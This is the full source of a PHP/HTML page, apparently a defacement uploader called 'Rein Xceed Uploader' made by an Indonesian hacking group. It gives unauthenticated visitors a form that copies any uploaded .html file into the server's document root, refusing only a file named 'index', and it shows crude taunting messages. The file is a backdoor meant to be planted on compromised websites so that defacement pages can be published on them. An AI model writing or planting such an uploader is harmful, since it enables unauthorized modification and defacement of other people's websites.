<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <meta name="author" content="./TuanDestroy">
    <meta name="description" content="Indonesian Hacker Rulez">
    <meta name="theme-color" content="#000">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Rock Salt|Righteous" rel="stylesheet">
    <link rel="icon" href="https://i.ibb.co/XCjyTFB/20191018-142851.png" type="image/jpg">
    <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css'>
    <script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script> 
		<script src='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.2.0/js/bootstrap.min.js'></script>
		<script src='https://unpkg.com/sweetalert/dist/sweetalert.min.js'></script>
    <title>./Rein Xceed Uploader</title>
    <style>
    	body{background-color:#000;font-family:"Righteous";color:#fff;}
    	#ico{width:200px;height:150px;}
    </style>
  </head>
  <body>

    <div class="container text-center mx-auto">
    	<h2 class="mt-3">./Rein Xceed Uploader</h2>
    	<img src="https://i.giphy.com/media/hA8zLYSL8rYME/giphy.webp" class="mx-auto d-block" id="ico">
    	<form method="post" enctype="multipart/form-data">
    		<div class="row">
    			<div class="col">
    				<input id="previews" placeholder="File Yg Di Pilih" class="form-control bg-transparent text-white" readonly="readonly">
    			</div>
    			
    			<div class="col">
    				<div class="input-group">
    					<div class="custom-file">
    						<input type="file" name="randsx" class="custom-file-input bg-transparent" id="FileSel">
    						<label class="custom-file-label bg-transparent" for="previews"></label>
    					</div>
    				</div>
    			</div>
    		</div>
    		<button type="submit" name="upload" class="btn btn-secondary btn-block bg-transparent mt-3" id="load" data-loading-text="<i class='fa fa-refresh fa-spin'></i> Silahkan tunggu">Upload</button>
    	</form><hr>

<?php
	$server   = $_SERVER['DOCUMENT_ROOT'];
	$namaFile = $_FILES['randsx']['name'];
	$getcwd   = "$server/$namaFile";
	$typeExt  = pathinfo($namaFile, PATHINFO_EXTENSION);
if(isset($_POST['upload'])){
if($namaFile !== ''){
	if(is_writable($server)){
		if($typeExt === 'html'){
			if($namaFile !== 'index'){
				if(@copy($_FILES['randsx']['tmp_name'], $getcwd)){
					$akses = 'http://'.$_SERVER['HTTP_HOST'].'/';
					echo '<script>swal("Berhasil", "Soof Trs Sana Tod", "success")</script>';
					echo '<a href="'.$akses.$namaFile.'" target="_blank">Hasil Upload</a>';
				}else{
					echo '<script>swal("Gagal Upload", "Gatau kenapa", "error")</script>';
				}
			}else{
				echo '<script>swal("Gagal Upload", "Jangan Ngindex Mek", "error")</script>';
			}
		}else{
			echo '<script>swal("Kesalahan", "Ekstensi file harus html", "info")</script>';
			}
		}else{
			echo '<script>swal("Gagal Upload", "Server Ga Support", "error")</script>';
		}
	}else{
		echo '<script>swal("Woii", "Belum pilih file Tolol", "info")</script>';
	}
}
?>
<footer>
	<small>&copy; reinxceed709@gmail.com</small>
</footer>
    </div>
		<script>
			document.getElementById('FileSel').onchange = function()
			{
				document.getElementById('previews').value = this.value;
			};
			
			$('.btn').on('click', function(){
				var $this = $(this);
				$this.button('loading');
			});
			
		</script>
  </body>
</html>
